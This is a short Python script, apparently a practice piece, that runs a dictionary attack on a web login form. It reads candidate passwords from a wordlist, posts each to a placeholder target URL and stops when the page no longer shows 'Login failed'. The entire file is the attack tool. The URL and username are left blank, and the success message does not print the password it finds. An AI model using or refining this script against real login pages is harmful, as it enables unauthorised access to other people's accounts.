#!/usr/bin/env python

import requests

target_url = "target page"
data_dict = { "login": "", "password": ""}

with open("pasword_list", "r") as wordlist_file:
    for password in wordlist_file:
        word = password.strip()
        data_dict['password'] = word
        response = requests.post(target_url, data = data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password --> ")
            exit()